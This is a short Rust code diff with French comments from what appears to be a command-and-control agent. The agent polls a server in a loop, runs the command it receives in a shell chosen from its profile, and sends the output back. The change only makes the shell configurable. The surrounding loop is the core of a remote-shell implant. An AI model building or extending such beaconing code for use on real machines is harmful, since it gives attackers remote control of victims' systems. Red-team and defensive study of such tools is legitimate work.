@@ -31,11 +31,13 @@ async fn main() {
 
     let client = Client::builder().build().unwrap();
 
+    let shell = profiles.get_shell().to_string();
+
     loop {
         // Récupérer et décoder la commande du serveur
         if let Some(cmd) = http::get_command(&client, api_url, &profiles.server, next_route).await {
             // Exécuter la commande
-            let output = executor::execute(&cmd.text).await;
+            let output = executor::execute(&cmd.text, &shell).await;
 
             // Encoder et envoyer la réponse
             let response = CommandResponse { output };
